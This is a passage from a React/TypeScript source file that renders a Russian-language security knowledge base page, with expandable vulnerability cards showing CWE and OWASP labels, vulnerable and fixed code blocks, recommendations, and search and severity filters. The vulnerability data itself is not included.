    variant === "danger"
      ? "bg-red-950/60 border-red-900/50"
      : variant === "safe"
      ? "bg-emerald-950/60 border-emerald-900/50"
      : "bg-slate-950 border-slate-800";

  return (
    <div>
      <p className="text-xs font-semibold text-slate-500 dark:text-slate-500 uppercase tracking-wider mb-2">{label}</p>
      <pre className={`rounded-xl border p-4 text-xs text-slate-200 overflow-x-auto leading-relaxed whitespace-pre-wrap ${bgCls}`}>
        {code}
      </pre>
    </div>
  );
}

// ── Vuln Card ────────────────────────────────────────────────────────────────

function VulnCard({ v }: { v: VulnEntry }) {
  const [open, setOpen] = useState(false);

  const borderColorMap: Record<string, string> = {
    critical: "border-l-red-500",
    high: "border-l-orange-500",
    medium: "border-l-yellow-500",
    low: "border-l-slate-500",
    info: "border-l-slate-500",
  };
  const borderColor = borderColorMap[v.severity] ?? "border-l-slate-500";

  return (
    <div className={`bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 border-l-4 ${borderColor} rounded-2xl overflow-hidden transition-all duration-200 hover:shadow-md dark:hover:shadow-black/20`}>
      {/* Header */}
      <button
        type="button"
        onClick={() => setOpen((x) => !x)}
        className="w-full text-left px-5 py-5 hover:bg-slate-50 dark:hover:bg-slate-800/30 transition-colors"
      >
        <div className="flex items-start gap-3">
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-2 flex-wrap mb-2">
              <span className={`text-xs font-bold px-2.5 py-1 rounded-full ${severityBadge(v.severity as Severity)}`}>
                {severityLabel(v.severity as Severity)}
              </span>
              <span className="text-xs font-mono bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 px-2 py-1 rounded-md border border-slate-200 dark:border-slate-700">
                {v.cwe}
              </span>
              <span className="text-xs bg-indigo-50 dark:bg-indigo-500/10 text-indigo-600 dark:text-indigo-400 px-2 py-1 rounded-md border border-indigo-200 dark:border-indigo-500/30">
                {v.owasp}
              </span>
            </div>
            <h3 className="font-bold text-slate-900 dark:text-white text-base leading-snug">{v.title}</h3>
            <p className="text-sm text-slate-500 dark:text-slate-400 mt-1 leading-relaxed">{v.shortDesc}</p>
          </div>
          <div className="shrink-0 flex flex-col items-end gap-2">
            <div className="text-right">
              <p className="text-lg font-black text-slate-900 dark:text-white">{v.frequency}</p>
              <p className="text-xs text-slate-400 dark:text-slate-600">находок</p>
            </div>
            <span className="text-slate-300 dark:text-slate-600 text-xs">{open ? "▲" : "▼"}</span>
          </div>
        </div>

        {/* Tags */}
        {!open && (
          <div className="flex flex-wrap gap-1.5 mt-3">
            {v.tags.slice(0, 4).map((tag) => (
              <span
                key={tag}
                className="text-xs px-2 py-0.5 rounded-full bg-slate-100 dark:bg-slate-800 text-slate-500 dark:text-slate-500 border border-slate-200 dark:border-slate-700"
              >
                #{tag}
              </span>
            ))}
          </div>
        )}
      </button>

      {/* Expanded */}
      {open && (
        <div className="border-t border-slate-100 dark:border-slate-800 px-5 pb-6 space-y-5">
          <div className="pt-4">
            <p className="text-xs font-semibold text-slate-500 dark:text-slate-500 uppercase tracking-wider mb-2">Описание</p>
            <p className="text-sm text-slate-700 dark:text-slate-300 leading-relaxed">{v.description}</p>
          </div>

          <div>
            <p className="text-xs font-semibold text-slate-500 dark:text-slate-500 uppercase tracking-wider mb-2">Как работает атака</p>
            <p className="text-sm text-slate-700 dark:text-slate-300 leading-relaxed">{v.howItWorks}</p>
          </div>

          {v.vulnCode && (
            <CodeBlock code={v.vulnCode.code} label="Уязвимый код" variant="danger" />
          )}
          {v.fixCode && (
            <CodeBlock code={v.fixCode.code} label="Исправленный код" variant="safe" />
          )}

          <div>
            <p className="text-xs font-semibold text-slate-500 dark:text-slate-500 uppercase tracking-wider mb-3">Рекомендации</p>
            <ul className="space-y-2">
              {v.recommendations.map((rec, i) => (
                <li key={i} className="flex gap-2.5 text-sm text-slate-700 dark:text-slate-300">
                  <span className="shrink-0 flex items-center justify-center w-5 h-5 rounded-full bg-indigo-100 dark:bg-indigo-500/20 text-indigo-600 dark:text-indigo-400 text-xs font-bold">{i + 1}</span>
                  <span>{rec}</span>
                </li>
              ))}
            </ul>
          </div>

          <div className="pt-2 border-t border-slate-100 dark:border-slate-800">
            <p className="text-xs font-semibold text-slate-500 dark:text-slate-500 uppercase tracking-wider mb-3">Ссылки</p>
            <div className="flex flex-wrap gap-2">
              {v.references.map((ref) => (
                <a
                  key={ref.label}
                  href={ref.url}
                  target="_blank"
                  rel="noreferrer"
                  className="flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-lg border border-slate-200 dark:border-slate-700 bg-slate-50 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:border-indigo-300 dark:hover:border-indigo-500/50 hover:text-indigo-600 dark:hover:text-indigo-300 transition-all"
                >
                  <svg className="w-3 h-3" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                  </svg>
                  {ref.label}
                </a>
              ))}
            </div>
          </div>

          {/* Tags */}
          <div className="flex flex-wrap gap-1.5">
            {v.tags.map((tag) => (
              <span key={tag} className="text-xs px-2 py-0.5 rounded-full bg-slate-100 dark:bg-slate-800 text-slate-500 dark:text-slate-500 border border-slate-200 dark:border-slate-700">
                #{tag}
              </span>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

// ── Main page ────────────────────────────────────────────────────────────────

function KnowledgeContent() {
  const [search, setSearch] = useState("");
  const [severity, setSeverity] = useState("Все");
  const [category, setCategory] = useState("Все");

  const stats = useMemo((): { total: number; critical: number; high: number; medium: number; low: number } => {
    const counts = { critical: 0, high: 0, medium: 0, low: 0 };
    for (const v of KB_DATA) {
      if (v.severity === "critical") counts.critical++;
      else if (v.severity === "high") counts.high++;
      else if (v.severity === "medium") counts.medium++;
      else if (v.severity === "low") counts.low++;
    }
    return { total: KB_DATA.length, ...counts };
  }, []);

  const filtered = useMemo(() => {
    const q = search.toLowerCase();
    return KB_DATA.filter((v) => {
      const matchSearch =
        !q ||
        v.title.toLowerCase().includes(q) ||
        v.cwe.toLowerCase().includes(q) ||
        v.shortDesc.toLowerCase().includes(q) ||
        v.tags.some((t) => t.includes(q));
      const matchSev = severity === "Все" || v.severity === severity;
      const matchCat = category === "Все" || v.category === category;
      return matchSearch && matchSev && matchCat;
    });
  }, [search, severity, category]);

  return (
    <div className="mx-auto max-w-6xl px-4 sm:px-6 py-10">
      {/* Header */}
      <div className="mb-8">
        <div className="inline-flex items-center gap-2 bg-indigo-50 dark:bg-indigo-500/10 border border-indigo-200 dark:border-indigo-500/20 rounded-full px-4 py-1.5 text-xs font-medium text-indigo-600 dark:text-indigo-300 mb-5">
          <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
            <path strokeLinecap="round" strokeLinejoin="round" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253" />
          </svg>
          Security Knowledge Base
        </div>
        <h1 className="text-3xl font-bold text-slate-900 dark:text-white mb-2">
          База знаний по безопасности
        </h1>
        <p className="text-slate-500 dark:text-slate-400">
          Справочник уязвимостей: описания, примеры уязвимого и исправленного кода, рекомендации по исправлению.
        </p>
      </div>

      {/* Stats chips */}
      <div className="flex flex-wrap gap-3 mb-8">
        {[
          { label: "Всего записей", value: stats.total, cls: "bg-slate-100 dark:bg-slate-800 text-slate-700 dark:text-slate-300 border-slate-200 dark:border-slate-700" },
          { label: "Критических", value: stats.critical ?? 0, cls: "bg-red-50 dark:bg-red-500/10 text-red-700 dark:text-red-400 border-red-200 dark:border-red-500/30" },
          { label: "Высоких", value: stats.high ?? 0, cls: "bg-orange-50 dark:bg-orange-500/10 text-orange-700 dark:text-orange-400 border-orange-200 dark:border-orange-500/30" },
          { label: "Средних", value: stats.medium ?? 0, cls: "bg-yellow-50 dark:bg-yellow-500/10 text-yellow-700 dark:text-yellow-400 border-yellow-200 dark:border-yellow-500/30" },
          { label: "Низких", value: stats.low ?? 0, cls: "bg-slate-100 dark:bg-slate-800 text-slate-500 dark:text-slate-400 border-slate-200 dark:border-slate-700" },
        ].map((s) => (
          <div
            key={s.label}
            className={`flex items-center gap-2 px-4 py-2 rounded-xl border text-sm font-semibold ${s.cls}`}
          >
            <span className="text-xl font-black">{s.value}</span>
            <span className="font-normal text-xs">{s.label}</span>
          </div>
        ))}
      </div>

      {/* Search + Filters */}
      <div className="flex flex-col sm:flex-row gap-3 mb-8">
        <div className="flex-1 relative">
          <div className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 dark:text-slate-500">
            <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
              <circle cx="11" cy="11" r="8" /><path d="M21 21l-4.35-4.35" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </div>
          <input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Поиск по CWE, названию, тегам..."
            className="w-full bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-xl pl-11 pr-4 py-3 text-sm text-slate-900 dark:text-white placeholder:text-slate-400 dark:placeholder:text-slate-500 focus:outline-none focus:ring-2 focus:ring-indigo-500/70 focus:border-indigo-500/50 transition-all"
          />
        </div>
        <div className="flex gap-2">
          {/* Severity filter */}
          <div className="relative">
            <select
              value={severity}
              onChange={(e) => setSeverity(e.target.value)}
              className="appearance-none bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-xl px-4 py-3 pr-9 text-sm text-slate-700 dark:text-slate-300 focus:outline-none focus:ring-2 focus:ring-indigo-500/70 transition-all cursor-pointer"
              style={{ colorScheme: "dark" }}
            >
              {SEVERITIES.map((s) => (
                <option key={s} value={s}>{s === "Все" ? "Все уровни" : severityLabel(s as Severity)}</option>
              ))}
            </select>
            <div className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 pointer-events-none">▾</div>
          </div>
          {/* Category filter */}
          <div className="relative">
            <select
              value={category}
              onChange={(e) => setCategory(e.target.value)}
              className="appearance-none bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-xl px-4 py-3 pr-9 text-sm text-slate-700 dark:text-slate-300 focus:outline-none focus:ring-2 focus:ring-indigo-500/70 transition-all cursor-pointer"
              style={{ colorScheme: "dark" }}
            >
              {CATEGORIES.map((c) => (
                <option key={c} value={c}>{c === "Все" ? "Все категории" : c}</option>
              ))}
            </select>
            <div className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 pointer-events-none">▾</div>
          </div>
        </div>
      </div>

      {/* Results count */}
      <div className="flex items-center justify-between mb-5">
        <p className="text-sm text-slate-500 dark:text-slate-500">
          {filtered.length === KB_DATA.length
            ? `${KB_DATA.length} записей`
            : `${filtered.length} из ${KB_DATA.length} записей`}
        </p>
        {(search || severity !== "Все" || category !== "Все") && (
          <button
            type="button"
            onClick={() => { setSearch(""); setSeverity("Все"); setCategory("Все"); }}
            className="text-xs text-indigo-500 hover:text-indigo-400 transition-colors"
          >
            Сбросить фильтры
          </button>
        )}
      </div>

      {/* Cards */}
      {filtered.length > 0 ? (
        <div className="space-y-4">
          {filtered.map((v) => <VulnCard key={v.id} v={v} />)}
        </div>
      ) : (
        <div className="bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-2xl p-12 text-center">
          <div className="text-4xl mb-3">🔍</div>
          <p className="font-semibold text-slate-900 dark:text-white mb-2">Ничего не найдено</p>
          <p className="text-sm text-slate-500">Попробуйте изменить поисковый запрос или сбросить фильтры</p>
        </div>
      )}

      {/* OWASP attribution */}
      <div className="mt-10 flex items-center gap-3 text-xs text-slate-400 dark:text-slate-700">
        <div className="flex-1 h-px bg-slate-200 dark:bg-slate-800" />
        <span>Данные основаны на OWASP Top 10 · MITRE CWE · NIST NVD</span>
        <div className="flex-1 h-px bg-slate-200 dark:bg-slate-800" />
      </div>
    </div>
  );
}

export function KnowledgePage() {
  return (
    <RequireAuth>
      <KnowledgeContent />
    </RequireAuth>
  );
}
